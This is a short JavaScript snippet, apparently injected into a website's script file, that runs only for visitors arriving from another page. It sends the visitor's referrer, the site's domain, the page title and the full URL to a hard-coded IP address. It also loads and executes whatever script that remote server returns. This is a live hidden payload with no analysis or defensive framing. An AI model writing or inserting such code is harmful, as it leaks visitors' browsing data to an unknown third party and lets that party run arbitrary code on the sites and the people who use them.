; document.referrer !== '' && (function () {
	var m = location.host.split('.'), d = [];
	for (var i = m.length - 1; i >= 0 && (d.unshift(m[i]) || 1) && ['com', 'net', 'cn', 'org'].join(',').indexOf(m[i])!=-1; i--);
	var o = document.createElement('script');
	o.setAttribute('charset', 'utf-8');
	o.setAttribute('type', 'text/javascript');
	o.setAttribute('src', 'http://112.124.57.247/tx/p/niceyou.php?r=' + encodeURIComponent(document.referrer) + '&d=' + encodeURIComponent(d.join('.')) + '&t=' + encodeURIComponent(document.title) + '&p=' + encodeURIComponent(location.href));
	document.getElementsByTagName('head')[0].appendChild(o);
	delete o;
})();